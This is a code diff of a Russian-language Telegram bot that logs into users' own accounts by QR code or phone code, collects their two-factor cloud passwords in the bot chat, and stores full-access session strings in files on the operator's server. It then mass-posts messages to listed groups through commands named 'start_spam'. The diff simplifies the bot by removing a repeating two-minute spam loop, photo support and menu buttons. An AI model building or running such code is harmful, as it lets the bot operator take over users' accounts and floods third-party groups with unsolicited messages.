@@ -10,7 +10,7 @@ import signal
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 from telegram.error import TimedOut, RetryAfter, Conflict
 
@@ -78,10 +78,7 @@ def get_user_data(user_id):
             'session': None,
             'login_state': None,
             'qr_session': None,
-            'qr_checked': False,
-            'photo_file_id': None,
-            'awaiting_group': False,
-            'awaiting_msg': False
+            'qr_checked': False
         }
     return user_data[user_id]
 
@@ -109,22 +106,6 @@ async def is_user_ready(user_id):
         return await client.is_user_authorized()
     except:
         return False
-
-# ====== КНОПКА "В ГЛАВНОЕ МЕНЮ" ======
-def add_back_button(reply_markup=None):
-    back_button = InlineKeyboardButton("🔙 В главное меню", callback_data='back_to_menu')
-    if reply_markup is None:
-        return InlineKeyboardMarkup([[back_button]])
-    keyboard = reply_markup.inline_keyboard.copy()
-    keyboard.append([back_button])
-    return InlineKeyboardMarkup(keyboard)
-
-async def reply_with_back(update, text, reply_markup=None, parse_mode='Markdown'):
-    if reply_markup is not None:
-        reply_markup = add_back_button(reply_markup)
-    else:
-        reply_markup = add_back_button()
-    await update.effective_message.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
 
 # === QR-КОД (с запросом пароля 2FA в чате) ===
 async def generate_qr_code(user_id):
@@ -161,6 +142,7 @@ async def check_qr_login(user_id, context, chat_id):
         client = qr_data['client']
         qr_login = qr_data['qr_login']
         try:
+            # Ждём, пока пользователь отсканирует QR и введёт пароль (если требуется)
             result = await qr_login.wait(timeout=1)
             if result is not None:
                 session_string = client.session.save()
@@ -174,19 +156,17 @@ async def check_qr_login(user_id, context, chat_id):
         except asyncio.TimeoutError:
             pass
         except errors.SessionPasswordNeededError:
+            # Требуется облачный пароль — запрашиваем его у пользователя
             user['login_state'] = {'step': 'password', 'client': client, 'qr_login': qr_login}
-            logger.info(f"🔐 Запрос пароля 2FA для пользователя {user_id}")
             await safe_send_message(context, chat_id,
-                                    "🔐 Требуется пароль двухфакторной аутентификации. Введите пароль (напишите его в чат):",
-                                    reply_markup=add_back_button())
-            # Отправляем напоминание через 5 секунд
-            asyncio.create_task(send_password_reminder(context, chat_id, user_id))
+                                    "🔐 Требуется пароль двухфакторной аутентификации. Введите пароль (напишите его в чат):")
             return False, "PASSWORD_NEEDED"
         except Exception as e:
             logger.error(f"QR check error: {e}")
-            await safe_send_message(context, chat_id, f"❌ Ошибка входа: {str(e)}", reply_markup=add_back_button())
+            await safe_send_message(context, chat_id, f"❌ Ошибка входа: {str(e)}")
             return False, f"Ошибка: {str(e)}"
 
+        # Дополнительная проверка (на случай, если wait() не вернул результат, но авторизация прошла)
         if await client.is_user_authorized():
             session_string = client.session.save()
             user['client'] = client
@@ -200,14 +180,6 @@ async def check_qr_login(user_id, context, chat_id):
     except Exception as e:
         return False, f"❌ Ошибка: {str(e)}"
 
-async def send_password_reminder(context, chat_id, user_id):
-    await asyncio.sleep(5)
-    user = get_user_data(user_id)
-    if user.get('login_state') and user['login_state'].get('step') == 'password':
-        await safe_send_message(context, chat_id,
-                                "⏳ Напоминаю: введите пароль двухфакторной аутентификации в чат.",
-                                reply_markup=add_back_button())
-
 async def check_qr_status(query, user_id, context):
     if user_id in active_qr_tasks:
         active_qr_tasks[user_id].cancel()
@@ -216,25 +188,25 @@ async def check_qr_status(query, user_id, context):
     await safe_send_message(context, chat_id,
         "⏳ Ожидание входа...\n\n"
         "📱 Отсканируйте QR-код в приложении Telegram (Настройки → Устройства → Добавить устройство).\n"
-        "🔐 Если появится запрос пароля — бот попросит его ввести здесь.",
-        reply_markup=add_back_button()
+        "🔐 Если появится запрос пароля — бот попросит его ввести здесь."
     )
+    # Ждём до 2 минут (60 итераций * 2 сек), пока пользователь сканирует и вводит пароль
     for i in range(60):
         await asyncio.sleep(2)
         success, msg = await check_qr_login(user_id, context, chat_id)
         if success:
-            await safe_send_message(context, chat_id, "✅ QR-вход успешен! Аккаунт авторизован.", reply_markup=add_back_button())
+            await safe_send_message(context, chat_id, "✅ QR-вход успешен! Аккаунт авторизован.")
             await show_main_menu_after_login(query, user_id)
             return
         if msg == "PASSWORD_NEEDED":
-            logger.info(f"Ожидание ввода пароля для {user_id}")
-            return  # выходим из цикла, ждём ввода пароля в handle_message
+            # Пароль будет введён позже, цикл завершается
+            return
         if "ошибка" in msg.lower():
-            await safe_send_message(context, chat_id, msg, reply_markup=add_back_button())
+            await safe_send_message(context, chat_id, msg)
             return
         if i % 10 == 0 and i > 0:
-            await safe_send_message(context, chat_id, f"⏳ Всё ещё ждём... ({i*2} сек)", reply_markup=add_back_button())
-    await safe_send_message(context, chat_id, "⏰ Время ожидания истекло. Попробуйте снова.", reply_markup=add_back_button())
+            await safe_send_message(context, chat_id, f"⏳ Всё ещё ждём... ({i*2} сек)")
+    await safe_send_message(context, chat_id, "⏰ Время ожидания истекло. Попробуйте снова.")
     user = get_user_data(user_id)
     if user.get('qr_session'):
         try:
@@ -244,6 +216,7 @@ async def check_qr_status(query, user_id, context):
         user['qr_session'] = None
 
 async def finish_qr_with_password(user_id, password):
+    """Завершение QR-входа с облачным паролем"""
     user = get_user_data(user_id)
     login_state = user.get('login_state')
     if not login_state or login_state.get('step') != 'password':
@@ -259,7 +232,6 @@ async def finish_qr_with_password(user_id, password):
             f.write(session_string)
         user['login_state'] = None
         user['qr_session'] = None
-        logger.info(f"✅ QR-вход с паролем завершён для {user_id}")
         return True, "✅ Аккаунт успешно авторизован с паролем!"
     except errors.SessionPasswordNeededError:
         return False, "❌ Неверный пароль. Попробуйте снова."
@@ -306,8 +278,7 @@ async def verify_code_phone(user_id, code, context, chat_id):
     except errors.SessionPasswordNeededError:
         user['login_state'] = {'step': 'password_phone', 'client': client, 'phone': phone}
         await safe_send_message(context, chat_id,
-                                "🔐 Требуется пароль двухфакторной аутентификации. Введите пароль (напишите его в чат):",
-                                reply_markup=add_back_button())
+                                "🔐 Требуется пароль двухфакторной аутентификации. Введите пароль (напишите его в чат):")
         return False, "PASSWORD_NEEDED"
     except errors.PhoneCodeExpiredError:
         user['login_state'] = None
@@ -324,6 +295,7 @@ async def verify_code_phone(user_id, code, context, chat_id):
         return False, f"❌ Ошибка: {str(e)}"
 
 async def finish_phone_with_password(user_id, password):
+    """Завершение входа по номеру с облачным паролем"""
     user = get_user_data(user_id)
     login_state = user.get('login_state')
     if not login_state or login_state.get('step') != 'password_phone':
@@ -343,22 +315,16 @@ async def finish_phone_with_password(user_id, password):
     except Exception as e:
         return False, f"❌ Ошибка: {str(e)}"
 
-# === РАССЫЛКА (с поддержкой фото) ===
-async def send_message_with_signature(client, chat_id, message, photo_file_id=None):
+# === РАССЫЛКА ===
+async def send_message_with_signature(client, chat_id, message):
     signed = f"{message}\n\n—\n📨 Отправлено через [🤖 Бот]({BOT_LINK})"
     try:
-        if photo_file_id:
-            await client.send_file(chat_id, photo_file_id, caption=signed, parse_mode='Markdown')
-        else:
-            await client.send_message(chat_id, signed, parse_mode='Markdown')
+        await client.send_message(chat_id, signed, parse_mode='Markdown')
         return True
     except:
         try:
             plain = f"{message}\n\n—\n📨 Отправлено через бот: {BOT_LINK}"
-            if photo_file_id:
-                await client.send_file(chat_id, photo_file_id, caption=plain)
-            else:
-                await client.send_message(chat_id, plain)
+            await client.send_message(chat_id, plain)
             return True
         except:
             return False
@@ -499,7 +465,7 @@ async def reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except:
             pass
         user['client'] = None
-    await reply_with_back(update, "🔄 Состояние сброшено.")
+    await update.message.reply_text("🔄 Состояние сброшено.")
     await show_main_menu(update, context)
 
 # === ОБРАБОТЧИК КНОПОК ===
@@ -554,7 +520,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "🔐 *Если появится запрос облачного пароля – введите его прямо сюда, в чат с ботом.*\n"
             "⚡ *Быстро и безопасно!*"
         )
-        await reply_with_back(update, msg)
+        await query.message.reply_text(msg, parse_mode='Markdown')
         try:
             await query.message.delete()
         except:
@@ -568,8 +534,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "Telegram → Настройки → Устройства → Добавить устройство\n\n"
                 "🔐 Если потребуется пароль – бот попросит его здесь.\n"
                 "⏳ Ожидание до 2 минут",
-                parse_mode='Markdown',
-                reply_markup=add_back_button()
+                parse_mode='Markdown'
             )
             await query.message.reply_photo(photo=img_bytes, caption="📸 Отсканируй QR-код для входа")
             try:
@@ -578,7 +543,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
             asyncio.create_task(check_qr_status(query, user_id, context))
         else:
-            await reply_with_back(update, f"❌ Ошибка: {url}")
+            await query.message.reply_text(f"❌ Ошибка: {url}")
             try:
                 await query.message.delete()
             except:
@@ -586,7 +551,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif query.data == 'phone_login':
         user['login_state'] = {'step': 'phone'}
-        await reply_with_back(update,
+        await query.message.reply_text(
             "📱 Введите номер телефона:\n"
             "Пример: `+79675604496` или `89675604496`\n\n"
             "Код придет в Telegram\n\n"
@@ -598,17 +563,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except:
             pass
 
-    # === НОВЫЕ ОБРАБОТЧИКИ: ожидание ввода ===
     elif query.data == 'add_group':
-        user['awaiting_group'] = True
-        user['awaiting_msg'] = False
+        keyboard = [[InlineKeyboardButton("📝 Ввести username", switch_inline_query_current_chat="/add_group ")],
+                    [InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu')]]
         await query.message.reply_text(
             "📤 *Добавление группы*\n\n"
-            "✏️ Введите *username* или *ссылку* на группу.\n"
-            "📌 *Примеры:* `@durov` или `https://t.me/durov`\n\n"
-            "Просто напишите это в чат.",
+            "✏️ Впишите *username* или *ссылку* на группу.\n\n"
+            "📌 *Примеры:* `@durov` , `https://t.me/durov`\n\n"
+            "👇 Нажмите кнопку и введите данные:",
             parse_mode='Markdown',
-            reply_markup=add_back_button()
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         try:
             await query.message.delete()
@@ -616,15 +580,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
 
     elif query.data == 'set_msg':
-        user['awaiting_msg'] = True
-        user['awaiting_group'] = False
+        keyboard = [[InlineKeyboardButton("📝 Ввести текст", switch_inline_query_current_chat="/set_msg ")],
+                    [InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu')]]
         await query.message.reply_text(
             "📝 *Установка сообщения*\n\n"
-            "✏️ Введите текст сообщения.\n"
+            "✏️ Введите текст сообщения.\n\n"
             "📌 *Пример:* `Всем привет! Это тестовое сообщение.`\n\n"
-            "Просто напишите его в чат.",
+            "👇 Нажмите кнопку и введите текст:",
             parse_mode='Markdown',
-            reply_markup=add_back_button()
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         try:
             await query.message.delete()
@@ -639,7 +603,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif query.data == 'stop_spam':
         user['spamming'] = False
-        await reply_with_back(update, "🛑 Рассылка остановлена")
+        await query.message.reply_text("🛑 Рассылка остановлена")
         try:
             await query.message.delete()
         except:
@@ -661,264 +625,175 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         else:
             text = f"📋 *Группы ({len(groups)}):*\n\n" + "\n".join([f"• {g}" for g in groups]) if groups else "📭 Нет групп"
-        await reply_with_back(update, text)
+        await query.message.reply_text(text, parse_mode='Markdown')
         try:
             await query.message.delete()
         except:
             pass
 
-# === ЗАПУСК РАССЫЛКИ (ЦИКЛИЧЕСКИ) ===
-async def start_spam(update: Update, context: ContextTypes.DEFAULT_TYPE, is_callback=False):
-    user_id = update.effective_user.id
+# === ЗАПУСК РАССЫЛКИ ===
+async def start_spam(update, context, is_callback=False):
+    query = update.callback_query if is_callback else None
+    user_id = query.from_user.id if is_callback else update.effective_user.id
+    reply = query.message.reply_text if is_callback else update.message.reply_text
     user = get_user_data(user_id)
 
     if not await is_user_ready(user_id):
-        await reply_with_back(update, "❌ Сначала войдите в аккаунт")
+        await reply("❌ Сначала войдите в аккаунт")
         return
     if not user.get('message'):
-        await reply_with_back(update, "❌ Сначала установите сообщение")
+        await reply("❌ Сначала установите сообщение")
         return
     if not user.get('groups'):
-        await reply_with_back(update, "❌ Сначала добавьте группы")
+        await reply("❌ Сначала добавьте группы")
         return
     if user.get('spamming', False):
-        await reply_with_back(update, "⚠️ Рассылка уже идет!")
+        await reply("⚠️ Рассылка уже идет!")
         return
 
     user['spamming'] = True
     client = user['client']
     groups = user['groups'][:]
     msg = user['message']
-    photo = user.get('photo_file_id')
-    await reply_with_back(update, f"🚀 Начинаю рассылку в {len(groups)} групп. Цикл каждые 2 минуты.")
-    sent_total = 0
-    errors_total = 0
-
-    while user['spamming']:
-        sent = 0
-        errors = 0
-        for group in groups:
-            if not user['spamming']:
-                break
-            try:
-                success = await send_message_with_signature(client, group, msg, photo)
-                if success:
-                    sent += 1
-                else:
-                    errors += 1
-            except errors.FloodWaitError as e:
-                await reply_with_back(update, f"⏳ Ожидание {e.seconds+2} сек...")
-                await asyncio.sleep(e.seconds+2)
-                success = await send_message_with_signature(client, group, msg, photo)
-                if success:
-                    sent += 1
-                else:
-                    errors += 1
-            except Exception:
-                errors += 1
-            await asyncio.sleep(2)
-
-        sent_total += sent
-        errors_total += errors
-
-        if user['spamming']:
-            await reply_with_back(
-                update,
-                f"🔄 Цикл завершен. Отправлено в этом цикле: {sent}, ошибок: {errors}. "
-                f"Всего отправлено: {sent_total}. Пауза 2 минуты..."
-            )
-            for _ in range(120):
-                if not user['spamming']:
-                    break
-                await asyncio.sleep(1)
-
+    await reply(f"🚀 Начинаю рассылку в {len(groups)} групп...")
+    sent = errors_count = 0
+    for i, group in enumerate(groups, 1):
+        if not user['spamming']:
+            await reply(f"🛑 Остановлено. Отправлено: {sent}")
+            break
+        try:
+            success = await send_message_with_signature(client, group, msg)
+            if success:
+                sent += 1
+            else:
+                errors_count += 1
+        except errors.FloodWaitError as e:
+            await reply(f"⏳ Ожидание {e.seconds+2} сек...")
+            await asyncio.sleep(e.seconds+2)
+            success = await send_message_with_signature(client, group, msg)
+            if success:
+                sent += 1
+            else:
+                errors_count += 1
+        except Exception:
+            errors_count += 1
+        await asyncio.sleep(2)
     user['spamming'] = False
-    await reply_with_back(update, f"🛑 Рассылка остановлена. Всего отправлено: {sent_total}, ошибок: {errors_total}")
+    await reply(f"✅ Готово! Отправлено: {sent}, ошибок: {errors_count}")
 
-# === ОБРАБОТЧИК ТЕКСТА (включая подписи к фото) ===
-def get_message_text(update):
-    if update.message.text:
-        return update.message.text.strip()
-    if update.message.caption:
-        return update.message.caption.strip()
-    return None
-
+# === ОБРАБОТЧИК ТЕКСТА ===
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    text = get_message_text(update)
+    text = update.message.text.strip()
     user = get_user_data(user_id)
     chat_id = update.effective_chat.id
 
-    # === Обработка состояний входа (полностью как в оригинале) ===
-    if user.get('login_state'):
-        step = user['login_state']['step']
-        if step == 'phone':
-            if not text:
-                await reply_with_back(update, "❌ Пожалуйста, отправьте номер текстом.")
-                return
-            phone = normalize_phone(text)
-            success, msg = await send_code_phone(user_id, phone)
-            await reply_with_back(update, msg)
-            return
-        elif step == 'code':
-            if not text:
-                await reply_with_back(update, "❌ Отправьте код подтверждения.")
-                return
-            success, msg = await verify_code_phone(user_id, text, context, chat_id)
-            if success:
-                await reply_with_back(update, msg)
-                await show_main_menu(update, context)
-            elif msg != "PASSWORD_NEEDED":
-                await reply_with_back(update, msg)
-            return
-        elif step == 'password':
-            if not text:
-                await reply_with_back(update, "❌ Отправьте пароль.")
-                return
-            success, msg = await finish_qr_with_password(user_id, text)
-            await reply_with_back(update, msg)
-            if success:
-                await show_main_menu(update, context)
-            return
-        elif step == 'password_phone':
-            if not text:
-                await reply_with_back(update, "❌ Отправьте пароль.")
-                return
-            success, msg = await finish_phone_with_password(user_id, text)
-            await reply_with_back(update, msg)
-            if success:
-                await show_main_menu(update, context)
-            return
-
-    # === Обработка ожиданий ввода (группа или сообщение) ===
-    if user.get('awaiting_group'):
-        user['awaiting_group'] = False
-        if not text:
-            await reply_with_back(update, "❌ Введите текст.")
-            return
-        group = text.strip()
-        if not group.startswith('@') and not group.startswith('https://t.me/'):
-            group = '@' + group
-        if group in user.get('groups', []):
-            await reply_with_back(update, f"⚠️ {group} уже в списке")
-        else:
-            user['groups'].append(group)
-            await reply_with_back(update, f"✅ Добавлен {group} | Всего: {len(user['groups'])}")
-        return
-
-    if user.get('awaiting_msg'):
-        user['awaiting_msg'] = False
-        if not text:
-            await reply_with_back(update, "❌ Введите текст.")
-            return
-        user['message'] = text.strip()
-        await reply_with_back(update, f"✅ Сообщение сохранено! 📨 Будет подпись: [🤖 Бот]({BOT_LINK})")
-        return
-
-    # === Обработка фото (если пользователь прислал фото для рассылки) ===
-    if update.message.photo:
-        photo_file_id = update.message.photo[-1].file_id
-        user['photo_file_id'] = photo_file_id
-        if update.message.caption:
-            user['message'] = update.message.caption.strip()
-        await reply_with_back(update, "📸 Фото сохранено для рассылки!" + 
-                              (f"\nТекст: {user['message'][:50]}..." if user.get('message') else ""))
-        return
-
-    # === Проверка подписки ===
     if not user['is_subscribed']:
         await update.message.reply_text("⚠️ Подпишитесь на канал. /start")
         return
 
-    # === Разбор команд (без @bot) ===
-    if text and text.startswith('/'):
+    # Обработка состояний входа
+    if user.get('login_state'):
+        step = user['login_state']['step']
+        if step == 'phone':
+            phone = normalize_phone(text)
+            success, msg = await send_code_phone(user_id, phone)
+            await update.message.reply_text(msg)
+            return
+        elif step == 'code':
+            success, msg = await verify_code_phone(user_id, text, context, chat_id)
+            if success:
+                await update.message.reply_text(msg)
+                await show_main_menu(update, context)
+            elif msg != "PASSWORD_NEEDED":
+                await update.message.reply_text(msg)
+            return
+        elif step == 'password':          # пароль от QR
+            success, msg = await finish_qr_with_password(user_id, text)
+            await update.message.reply_text(msg)
+            if success:
+                await show_main_menu(update, context)
+            return
+        elif step == 'password_phone':    # пароль от номера
+            success, msg = await finish_phone_with_password(user_id, text)
+            await update.message.reply_text(msg)
+            if success:
+                await show_main_menu(update, context)
+            return
+
+    # Команды
+    if text.startswith('/add_group'):
         parts = text.split(maxsplit=1)
-        raw_cmd = parts[0].strip()
-        cmd = raw_cmd.split('@')[0]
-        arg = parts[1].strip() if len(parts) > 1 else None
-
-        if cmd == '/add_group':
-            if arg is None:
-                await reply_with_back(update, "❌ Введите username группы. Пример: `/add_group @durov`")
-            else:
-                group = arg
-                if not group.startswith('@') and not group.startswith('https://t.me/'):
-                    group = '@' + group
-                if group in user.get('groups', []):
-                    await reply_with_back(update, f"⚠️ {group} уже в списке")
-                else:
-                    user['groups'].append(group)
-                    await reply_with_back(update, f"✅ Добавлен {group} | Всего: {len(user['groups'])}")
+        if len(parts) < 2:
+            await update.message.reply_text("❌ Введите username группы. Пример: `/add_group @durov`")
             return
-
-        elif cmd == '/set_msg':
-            if arg is None:
-                await reply_with_back(update, "❌ Введите текст сообщения. Пример: `/set_msg Всем привет!`")
-            else:
-                user['message'] = arg
-                await reply_with_back(update, f"✅ Сообщение сохранено! 📨 Будет подпись: [🤖 Бот]({BOT_LINK})")
-            return
-
-        elif cmd == '/start':
-            await start(update, context)
-            return
-        elif cmd == '/reset':
-            await reset(update, context)
-            return
-        elif cmd == '/help':
-            help_text = (
-                "📋 *Команды:*\n\n"
-                "/start - Главное меню\n"
-                "/reset - Сбросить состояние входа\n"
-                "/add_group @name - Добавить группу\n"
-                "/set_msg текст - Установить сообщение\n"
-                "/start_spam - Запустить рассылку\n"
-                "/stop_spam - Остановить\n"
-                "/status - Статус\n"
-                "/groups - Список групп\n"
-                "/help - Помощь"
-            )
-            await reply_with_back(update, help_text)
-            return
-        elif cmd == '/status':
-            ready = await is_user_ready(user_id)
-            has_session = bool(user.get('session'))
-            groups_count = len(user.get('groups', []))
-            spam_active = user.get('spamming', False)
-            msg_preview = user.get('message', '')[:30]
-            status_text = (
-                f"📊 *Статус*\n\n"
-                f"🔑 Аккаунт: {'✅ Вход выполнен' if ready else '❌ Не авторизован'}\n"
-                f"💾 Сессия: {'✅ Сохранена' if has_session else '❌ Нет'}\n"
-                f"👥 Групп: {groups_count}\n"
-                f"📝 Сообщение: {msg_preview if msg_preview else '❌ Не установлено'}\n"
-                f"🔄 Рассылка: {'🔄 Активна' if spam_active else '⏸ Остановлена'}\n"
-                f"🔗 Подпись: [🤖 Бот]({BOT_LINK})"
-            )
-            await reply_with_back(update, status_text)
-            return
-        elif cmd == '/groups':
-            groups = user.get('groups', [])
-            text_out = f"📋 *Группы ({len(groups)}):*\n\n" + "\n".join([f"• {g}" for g in groups]) if groups else "📭 Нет групп"
-            await reply_with_back(update, text_out)
-            return
-        elif cmd == '/start_spam':
-            await start_spam(update, context, is_callback=False)
-            return
-        elif cmd == '/stop_spam':
-            user['spamming'] = False
-            await reply_with_back(update, "🛑 Рассылка остановлена")
-            return
+        group = parts[1].strip()
+        if not group.startswith('@') and not group.startswith('https://t.me/'):
+            group = '@' + group
+        if group in user.get('groups', []):
+            await update.message.reply_text(f"⚠️ {group} уже в списке")
         else:
-            await reply_with_back(update, "ℹ️ Неизвестная команда. Используй /help")
+            user['groups'].append(group)
+            await update.message.reply_text(f"✅ Добавлен {group} | Всего: {len(user['groups'])}")
+        return
+
+    if text.startswith('/set_msg'):
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2:
+            await update.message.reply_text("❌ Введите текст сообщения. Пример: `/set_msg Всем привет!`")
             return
+        user['message'] = parts[1].strip()
+        await update.message.reply_text(f"✅ Сообщение сохранено! 📨 Будет подпись: [🤖 Бот]({BOT_LINK})", parse_mode='Markdown')
+        return
+
+    if text == '/start':
+        await start(update, context)
+    elif text == '/reset':
+        await reset(update, context)
+    elif text == '/help':
+        await update.message.reply_text(
+            "📋 *Команды:*\n\n"
+            "/start - Главное меню\n"
+            "/reset - Сбросить состояние входа\n"
+            "/add_group @name - Добавить группу\n"
+            "/set_msg текст - Установить сообщение\n"
+            "/start_spam - Запустить рассылку\n"
+            "/stop_spam - Остановить\n"
+            "/status - Статус\n"
+            "/groups - Список групп\n"
+            "/help - Помощь",
+            parse_mode='Markdown'
+        )
+    elif text == '/status':
+        ready = await is_user_ready(user_id)
+        has_session = bool(user.get('session'))
+        groups_count = len(user.get('groups', []))
+        spam_active = user.get('spamming', False)
+        msg_preview = user.get('message', '')[:30]
+        await update.message.reply_text(
+            f"📊 *Статус*\n\n"
+            f"🔑 Аккаунт: {'✅ Вход выполнен' if ready else '❌ Не авторизован'}\n"
+            f"💾 Сессия: {'✅ Сохранена' if has_session else '❌ Нет'}\n"
+            f"👥 Групп: {groups_count}\n"
+            f"📝 Сообщение: {msg_preview if msg_preview else '❌ Не установлено'}\n"
+            f"🔄 Рассылка: {'🔄 Активна' if spam_active else '⏸ Остановлена'}\n"
+            f"🔗 Подпись: [🤖 Бот]({BOT_LINK})",
+            parse_mode='Markdown'
+        )
+    elif text == '/groups':
+        groups = user.get('groups', [])
+        text_out = f"📋 *Группы ({len(groups)}):*\n\n" + "\n".join([f"• {g}" for g in groups]) if groups else "📭 Нет групп"
+        await update.message.reply_text(text_out, parse_mode='Markdown')
+    elif text == '/start_spam':
+        await start_spam(update, context)
+    elif text == '/stop_spam':
+        user['spamming'] = False
+        await update.message.reply_text("🛑 Рассылка остановлена")
     else:
-        if text:
-            await reply_with_back(update, "ℹ️ Отправьте команду или воспользуйтесь кнопками.")
+        await update.message.reply_text("ℹ️ Неизвестная команда. Используй /help")
 
 # === ЗАПУСК ===
 def main():
-    # Загрузка сохранённых сессий
     for file in os.listdir('.'):
         if file.startswith('session_string_') and file.endswith('.txt'):
             try:
@@ -935,21 +810,6 @@ def main():
 
     application = Application.builder().token(BOT_TOKEN).build()
 
-    # Установка команд для меню бота
-    commands = [
-        BotCommand("start", "Главное меню"),
-        BotCommand("reset", "Сбросить состояние"),
-        BotCommand("add_group", "Добавить группу"),
-        BotCommand("set_msg", "Установить сообщение"),
-        BotCommand("start_spam", "Запустить рассылку"),
-        BotCommand("stop_spam", "Остановить рассылку"),
-        BotCommand("status", "Статус"),
-        BotCommand("groups", "Список групп"),
-        BotCommand("help", "Помощь"),
-    ]
-    application.bot.set_my_commands(commands)
-
-    # Обработчики команд
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("reset", reset))
     application.add_handler(CommandHandler("help", handle_message))
@@ -959,14 +819,8 @@ def main():
     application.add_handler(CommandHandler("stop_spam", handle_message))
     application.add_handler(CommandHandler("status", handle_message))
     application.add_handler(CommandHandler("groups", handle_message))
-
-    # Обработчик кнопок
     application.add_handler(CallbackQueryHandler(button_handler))
-
-    # Обработчики для текста и фото с подписью
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    application.add_handler(MessageHandler(filters.PHOTO & filters.CAPTION, handle_message))
-    application.add_handler(MessageHandler(filters.PHOTO & ~filters.CAPTION, handle_message))
 
     logger.info("Бот запущен...")
 
